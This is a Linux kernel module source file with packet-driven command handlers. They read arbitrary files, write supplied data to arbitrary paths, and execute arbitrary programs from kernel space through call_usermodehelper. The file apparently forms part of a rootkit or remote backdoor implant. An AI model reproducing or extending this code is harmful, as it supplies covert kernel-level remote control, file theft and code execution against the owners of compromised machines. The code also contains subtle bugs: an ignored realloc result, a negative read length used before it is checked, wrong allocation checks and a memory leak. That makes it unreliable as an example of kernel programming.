#include <linux/types.h>
#include <linux/module.h>
#include <linux/fcntl.h>
#include <linux/fs.h>

#include "handlers.h"
#include "../packet/packet.h"
#include "../../mem/mngt.h"

int cmd_handle_file_read(const packet_req_t *packet, u8 **res_buf, size_t *res_buflen)
{
    struct file *file;
    //size_t res_buflen_old = 0;
    char *tmp_buf;
    size_t tmp_buflen;
    int retv = 0;

    file = filp_open(packet->content, O_RDONLY, 0);
    if (IS_ERR(file))
    {
        pr_err("[!] failed to open file\n");
        return PTR_ERR(file);
    }

    tmp_buflen = 4096;
    tmp_buf = kzmalloc(tmp_buflen, GFP_KERNEL);
    if (IS_ERR(tmp_buf))
        return PTR_ERR(tmp_buf);

    pr_err("[*] reading file (%p, %p)...\n", file, tmp_buf);
    retv = kernel_read(file, tmp_buf, 4096, NULL);
    if (retv < 0)
    {
        pr_err("[!] failed to read file\n");
        goto LAB_OUT;
    }

    *res_buflen = retv;
    *res_buf = kzmalloc(retv, GFP_KERNEL);
    if (IS_ERR(*res_buf))
    {
        *res_buf = NULL;
        *res_buflen = 0;
        kzfree(tmp_buf, tmp_buflen);

        return PTR_ERR(*res_buf);
    }

    memcpy(*res_buf, tmp_buf, *res_buflen);

    while (retv == 4096)
    {
        pr_err("[*] reading file...\n");
        retv = kernel_read(file, tmp_buf, 4096, NULL);
    
        kzrealloc(*res_buf, *res_buflen, *res_buflen + retv);
        memcpy(*res_buf + *res_buflen, tmp_buf, retv);
        *res_buflen += retv;
        
        if (retv < 0)
        {
            pr_err("[!] failed to read file\n");
            goto LAB_OUT;
        }
    }

LAB_OUT:
    filp_close(file, NULL);    
    kzfree(tmp_buf, tmp_buflen);
    return 0;
}

int cmd_handle_file_write(const packet_req_t *packet, u8 **res_buf, size_t *res_buflen)
{
    size_t file_pathlen;
    struct file *file;
    int retv;

    file_pathlen = strlen(packet->content);
    file = filp_open(packet->content, O_WRONLY | O_CREAT, 0);
    if (IS_ERR(file))
    {
        pr_err("[!] failed to open file\n");
        return PTR_ERR(file);
    }

    pr_err("[*] writing size: %lu\n", packet->content_len - file_pathlen - 3);
    retv = kernel_write(file, packet->content + file_pathlen + 1, packet->content_len - file_pathlen - 3, 0);
    filp_close(file, NULL);
    if (retv < 0)
    {
        pr_err("[!] failed to write to file\n");
        return retv;
    }
    
    return 0;
}


int cmd_handle_file_exec(const packet_req_t *packet, u8 **res_buf, size_t *res_buflen)
{
    char* envp[] = {"HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};
    char* argv[] = {NULL, NULL};

    // quick 'n dirty way to circumvent const
    u8* content_mod = kzmalloc(packet->content_len, GFP_KERNEL);
    memcpy(content_mod, packet->content, packet->content_len);

    argv[0] = content_mod;

    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}